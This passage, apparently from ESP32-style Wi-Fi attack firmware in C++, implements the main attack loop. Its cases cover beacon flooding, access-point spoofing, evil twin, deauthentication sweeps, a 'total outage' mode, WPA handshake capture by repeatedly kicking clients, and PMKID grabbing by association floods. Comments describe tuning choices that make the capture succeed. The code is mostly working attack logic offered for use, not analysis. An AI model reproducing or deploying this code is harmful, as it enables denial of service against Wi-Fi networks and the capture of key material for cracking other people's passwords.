      uint8_t bssid[6]; randomBSSID(bssid);
      char ssid[13]; randomSSID(ssid, sizeof(ssid)-1);
      uint8_t ch = ATTACK_CHANNELS[random(0, ATTACK_CHANNEL_COUNT)];
      txBeaconFrame(ssid, ch, bssid, (random(0,2))==1);
      sSweepCount++;
      break;
    }

    // ---------------- Spoof / combos ----------------
    case AttackType::SPOOF_AP:
    {
      if(sTargets.empty()){ attackStop(); return; }
      const TargetAP &t = sTargets[0];
      if(now - sLastTickMs >= 50){
        sLastTickMs = now;
        const char *ssid = (t.ssid[0]) ? t.ssid : "Network";
        // Clone beacons rotate across all attack channels (Nova X AP spoofing)
        uint8_t ch = ATTACK_CHANNELS[sBeaconRotate % ATTACK_CHANNEL_COUNT];
        sBeaconRotate++;
        txBeaconFrame(ssid, ch, t.bssid, t.encrypted);
      }
      // Answer probes aimed at the clone with its real identity
      if(!sProbeQ.empty() && (now - sLastProbeResp >= 200)){
        sLastProbeResp = now;
        ProbeReq pr = sProbeQ.back(); sProbeQ.pop_back();
        const char *ssid = (t.ssid[0]) ? t.ssid : "Network";
        txProbeResponse(t.bssid, ssid, pr.channel, pr.sender);
      }
      // Periodic deauth burst every 10 s (Nova X behavior)
      if(now - sLastDeauthBurst >= 10000){
        sLastDeauthBurst = now;
        txDeauthBSSID(t.bssid, t.channel);
      }
      break;
    }
    case AttackType::EVIL_TWIN:
    {
      if(sTargets.empty()){ attackStop(); return; }
      const TargetAP &t = sTargets[0];
      if(now - sLastTickMs >= 60){
        sLastTickMs = now;
        const char *ssid = (t.ssid[0]) ? t.ssid : "Network";
        txBeaconFrame(ssid, t.channel, t.bssid, t.encrypted);
      }
      if(now - sLastDeauthBurst >= 700){
        sLastDeauthBurst = now;
        txDeauthBSSID(t.bssid, t.channel);
      }
      break;
    }
    case AttackType::DEAUTH_RICKROLL:
    {
      if(sTargets.empty() && sKnownAPs.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 8u*tickMul()) return;
      sLastTickMs = now;
      // Alternate: deauth sweep tick, then a rickroll beacon
      if((sSweepCount & 1) == 0){
        if(!sTargets.empty()){
          const TargetAP &t = sTargets[sCurTarget];
          txDeauthBSSID(t.bssid, t.channel);
          sCurTarget = (sCurTarget + 1) % sTargets.size();
        } else {
          uint8_t ch = ATTACK_CHANNELS[sHopIdx];
          setChannel(ch);
          for(auto &t : sKnownAPs) if(t.channel == ch) txDeauthBSSID(t.bssid, ch);
          sHopIdx = (uint8_t)((sHopIdx + 1) % ATTACK_CHANNEL_COUNT);
        }
      } else {
        uint8_t bssid[6]; randomBSSID(bssid);
        const char *ssid = RICKROLL_SSIDS[sBeaconRotate % RICKROLL_COUNT];
        sBeaconRotate++;
        txBeaconFrame(ssid, 1, bssid, false);
      }
      sSweepCount++;
      break;
    }
    case AttackType::TOTAL_OUTAGE:
    {
      if(now - sLastTickMs < 8u*tickMul()) return;
      sLastTickMs = now;
      // Triple threat: deauth sweep + fake random beacons + BLE spam (BLE handled by UI)
      if(!sTargets.empty()){
        const TargetAP &t = sTargets[sCurTarget];
        txDeauthBSSID(t.bssid, t.channel);
        sCurTarget = (sCurTarget + 1) % sTargets.size();
      } else {
        uint8_t ch = ATTACK_CHANNELS[sHopIdx];
        setChannel(ch);
        for(auto &t : sKnownAPs) if(t.channel == ch) txDeauthBSSID(t.bssid, ch);
        sHopIdx = (uint8_t)((sHopIdx + 1) % ATTACK_CHANNEL_COUNT);
      }
      if((sSweepCount % 3) == 0){
        uint8_t bssid[6]; randomBSSID(bssid);
        char ssid[13]; randomSSID(ssid, sizeof(ssid)-1);
        txBeaconFrame(ssid, 1, bssid, false);
      }
      sSweepCount++;
      break;
    }
    case AttackType::HS_CAPTURE:
    {
      if(sTargets.empty()){ attackStop(); return; }
      promiscEnable();                      // idempotent; keeps RX alive
      const TargetAP &t = sTargets[0];
      // V25 FIX (the "capture handshake does not work" report): the channel
      // was re-set on EVERY service tick (~300x/s), which starves the RX path
      // so no EAPOL frame ever reached the sniffer. Pin once + re-pin only if
      // the radio drifted; the deauth burst below re-asserts it anyway.
      if(!sChannelPinned || sChannel != t.channel) setChannel(t.channel);
      // V20: aggressive forced-reconnect cycle. A hard broadcast deauth plus
      // directed kicks at every known client of this AP every 1.2 s makes
      // clients reassociate constantly, which is exactly when fresh EAPOL
      // M1-M4 handshakes fly through the air and get captured.
      if(now - sLastDeauthBurst >= (uint32_t)(1200u*tickMul())){
        sLastDeauthBurst = now;
        setChannelForce(t.channel);         // absolute re-pin inside the paced block
        txDeauthBSSID(t.bssid, t.channel);
        uint8_t kicks = 0;
        for(size_t i=0;i<sSTAs.size() && kicks<6;i++){
          if(memcmp(sSTAs[i].ap, t.bssid, 6) != 0) continue;
          txDeauthSTA(sSTAs[i].sta, t.bssid, t.channel);
          kicks++;
        }
      }
      sSweepCount++;
      break;
    }
    case AttackType::PMKID_GRAB:
    {
      if(sTargets.empty()){ attackStop(); return; }
      promiscEnable();
      const TargetAP &t = sTargets[0];
      if(!sChannelPinned || sChannel != t.channel) setChannel(t.channel);   // V25: paced
      // V20: double rate (25 ms) + alternating assoc from different random
      // client MACs so the router keeps allocating fresh PMKID material and
      // answers with an M1 that carries it - no client, no full handshake.
      if(now - sLastTickMs < (uint32_t)(25u*tickMul())) break;
      sLastTickMs = now;
      const char *ssid = (t.ssid[0]) ? t.ssid : "Network";
      txAssocFrame(t.bssid, ssid, t.channel);
      sSweepCount++;
      break;
    }
    case AttackType::FIND_WIFI:
    {
      // V25 FIND WIFI: hop the chosen band, keep kicking the device, let the
      // sniffer tell us which network it runs back to. Lock onto the first
      // (or most-heard) candidate and stay on its channel until the beacon
      // reveals the name or the user picks/skips.
      promiscEnable();
      uint32_t now2 = millis();
      if(sFindLock >= 0){
        const FindNet &n = sFindNets[sFindLock];
        if(!sChannelPinned || sChannel != n.channel) setChannel(n.channel);
      } else {
        // auto-lock: the candidate we have heard the most frames from
        int best = -1;
        for(size_t i=0;i<sFindCount;i++){
          if(sFindNets[i].skipped) continue;
          if(best < 0 || sFindNets[i].frames > sFindNets[best].frames) best = (int)i;
        }
        if(best >= 0 && sFindNets[best].frames >= 2) sFindLock = best;
        // hop
        if(now2 - sFindLastHopMs >= 200){
          sFindLastHopMs = now2;
          const uint8_t *CHS = sFindBand24 ? FIND_CH_24 : FIND_CH_5G;
          const uint8_t  N   = sFindBand24 ? FIND_CH_24_COUNT : FIND_CH_5G_COUNT;
          setChannel(CHS[sFindHopIdx % N]);
          sFindHopIdx = (uint8_t)((sFindHopIdx + 1) % N);
          sSweepCount++;
        }
      }
      // the interrogation itself: 3-frame kick volley every 110 ms
      if(sFindHasSta && (now2 - sFindLastKickMs >= 110)){
        sFindLastKickMs = now2;
        txFindKick(sFindLock >= 0 ? sFindNets[sFindLock].channel : sChannel);
      }
      break;
    }
    default:
      attackStop();
      break;
  }
}

static void setBeaconPrefix(const String &p){ sBeaconPrefix = (p.length() ? p : String("SALARINI")); }

} // namespace ae
